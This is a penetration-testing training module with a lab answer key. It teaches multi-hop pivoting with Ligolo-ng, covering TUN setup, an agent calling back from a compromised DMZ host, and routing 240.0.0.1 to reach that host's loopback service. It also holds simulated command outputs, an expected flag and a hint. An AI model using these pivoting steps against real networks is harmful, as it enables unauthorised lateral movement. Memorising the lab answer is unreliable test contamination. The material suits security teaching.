---
id: mod-pt-501
track_id: track-pentest
slug: multi-hop-pivoting-ligolo-ng-virtual-tun
title: '501: Multi-Hop Pivoting: Ligolo-ng Virtual TUN & 240.0.0.1/32 Loopback'
difficulty: Advanced
order_index: 17
estimated_minutes: 45
lab_type: terminal
lab_briefing: From your Kali workstation (10.10.14.5), initialize the ligolo-ng proxy interface, accept the agent connection from Ubuntu DMZ host 192.168.1.9, add the route for the internal pivot loopback (240.0.0.1/32), and query the loopback service on http://240.0.0.1:8080/internal-config to extract the pivot verification flag.
expected_flag: FLAG{LIGOLO_TUN_240_LOOPBACK_PIVOT}
hint: Add the 240.0.0.1/32 route and curl http://240.0.0.1:8080/internal-config to extract FLAG{LIGOLO_TUN_240_LOOPBACK_PIVOT}.
lab_config:
  target_ip: 192.168.1.9 (dmz-ignite-01) -> 240.0.0.1:8080
  quick_commands:
    - sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up
    - ligolo-proxy -selfcert -laddr 0.0.0.0:11601
    - sudo ip route add 240.0.0.1/32 dev ligolo
    - curl -s http://240.0.0.1:8080/internal-config
  commands:
    sudo ip tuntap add user root mode tun ligolo && sudo ip link set ligolo up: '[+] Created TUN interface "ligolo" (mtu 1500, state UP)'
    ligolo-proxy -selfcert -laddr 0.0.0.0:11601: |-
      INFO[0000] Listening on 0.0.0.0:11601 (TLS Self-Signed)
      INFO[0002] Agent connected: user@dmz-ignite-01 (192.168.1.9:49212)
      INFO[0002] Starting tunnel session 1 on interface ligolo
    sudo ip route add 240.0.0.1/32 dev ligolo: '[+] Route added: 240.0.0.1/32 -> dev ligolo (Kernel virtual TUN routing enabled)'
    curl -s http://240.0.0.1:8080/internal-config: |-
      {
        "service": "Internal Loopback Administration Gateway",
        "bound_address": "127.0.0.1:8080",
        "pivot_status": "LIGOLO_TUN_ROUTED",
        "internal_segment_key": "FLAG{LIGOLO_TUN_240_LOOPBACK_PIVOT}"
      }
---

# 501: Multi-Hop Pivoting: Ligolo-ng Virtual TUN & 240.0.0.1/32 Loopback

## Sub-Unit 14.1 & 14.2: Layer 2 SOCKS vs. Layer 3 Virtual TUN Routing

In segmented enterprise networks, an external foothold in a DMZ cannot directly communicate with internal domain controllers or database subnets without network pivoting.

Historically, testers relied on Layer 2 SOCKS proxies (`ssh -D 1080` or `chisel` paired with `proxychains`). However, SOCKS proxy wrappers:
- Restrict traffic strictly to TCP (breaking ICMP ping sweeps, OS detection, and UDP port scans).
- Impose massive latency: a full Nmap port scan across a pivoted subnet takes approximately **23 minutes (~1,380s)** via proxychains compared to just **62 seconds** over a native virtual network interface!

![Ligolo-ng Virtual TUN Benchmark Comparison](/assets/curriculum/ligolo-tun-benchmark.png)

## Sub-Unit 14.3: Deploying Ligolo-ng & The 240.0.0.1/32 Loopback Trick

**Ligolo-ng** creates a native kernel virtual TUN interface (`ligolo`) on your Kali host:
```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```
On the compromised pivot host, launch the lightweight Go agent:
```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```
Once connected, route the internal subnet over the TUN interface:
```bash
sudo ip route add 192.168.147.0/24 dev ligolo
```

**Accessing Remote Pivot Loopback Services (`240.0.0.1/32`)**:
If the compromised pivot host has an internal web console bound strictly to `127.0.0.1:8080`, you do not need port forwarding! Simply route `240.0.0.1/32` to your TUN interface:
```bash
sudo ip route add 240.0.0.1/32 dev ligolo
curl http://240.0.0.1:8080/
```
Ligolo automatically translates `240.0.0.1` directly to the pivot agent's local loopback!

![Multi-Hop Enterprise Pivoting Architecture](/assets/curriculum/enterprise-pivot-topology.png)
